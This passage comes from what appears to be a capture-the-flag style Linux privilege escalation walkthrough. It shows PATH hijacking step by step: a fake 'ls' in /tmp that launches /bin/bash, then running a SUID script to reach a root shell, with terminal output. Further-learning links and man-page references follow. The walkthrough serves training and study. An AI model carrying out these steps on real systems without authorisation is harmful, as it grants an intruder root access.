user5@polobox:~$ 
```

Answer: `ls`

Now we know what command to imitate, let's change directory to "tmp".

Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:

echo "[whatever command we want to run]" > [name of the executable we're imitating]

#### What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating

Hint: The command is actually just the path to the bash executable "/bin/bash".

Answer: `echo "/bin/bash" > ls`

Great! Now we've made our imitation, we need to make it an executable.

#### What command do we execute to do this?

Hint: e 'x' ecutable

```bash
user5@polobox:~$ cd /tmp
user5@polobox:/tmp$ echo "/bin/bash" > ls
user5@polobox:/tmp$ cat ls
/bin/bash
user5@polobox:/tmp$ chmod +x ls 
user5@polobox:/tmp$ 
```

Answer: `chmod +x ls`

Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command `export PATH=/tmp:$PATH`

Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is.

Once you've finished the exploit, you can exit out of root and use "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH" to reset the PATH variable back to default, letting you use "ls" again!

```bash
user5@polobox:/tmp$ export PATH=/tmp:$PATH
user5@polobox:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
user5@polobox:/tmp$ ~/script 
Welcome to Linux Lite 4.4 user5
 
Sunday 12 April 2026, 07:38:21
Memory Usage: 348/1991MB (17.48%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1004(user5)
root@polobox:/tmp# exit
exit
user5@polobox:/tmp$ 
```

Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!

---------------------------------------------------------------------------------------

### Task 10: Expanding Your Knowledge

#### Further Learning

There is never a "magic" answer in the huge area that is Linux Privilege Escalation. This is simply a few examples of basic things to watch out for when trying to escalate privileges.The only way to get better at it, is to practice and build up experience. Checklists are a good way to make sure you haven't missed anything during your enumeration stage, and also to provide you with a resource to check how to do things if you forget exactly what commands to use.

Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.

- [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
- [https://payatu.com/blog/a-guide-to-linux-privilege-escalation/](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/)

#### Thank you

Thanks for taking the time to work through this room, I wish you the best of luck in future.

~ Polo

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [cat - Linux manual page](https://man7.org/linux/man-pages/man1/cat.1.html)
- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [cp - Linux manual page](https://man7.org/linux/man-pages/man1/cp.1.html)
- [cron - Wikipedia](https://en.wikipedia.org/wiki/Cron)
- [crontab(5) - Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [echo - Linux manual page](https://man7.org/linux/man-pages/man1/echo.1.html)
- [Environment variable - Wikipedia](https://en.wikipedia.org/wiki/Environment_variable)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [GTFOBins - Homepage](https://gtfobins.github.io/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [LinEnum - GitHub](https://github.com/rebootuser/LinEnum)
- [Msfvenom - Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Msfvenom - Kali Tools](https://www.kali.org/tools/metasploit-framework/#msfvenom)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [openssl - Linux manual page](https://linux.die.net/man/1/openssl)
- [OpenSSL - Wikipedia](https://en.wikipedia.org/wiki/OpenSSL)
- [passwd - Wikipedia](https://en.wikipedia.org/wiki/Passwd)
- [passwd(5) - Linux manual page](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [shadow - Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [tail - Linux manual page](https://man7.org/linux/man-pages/man1/tail.1.html)
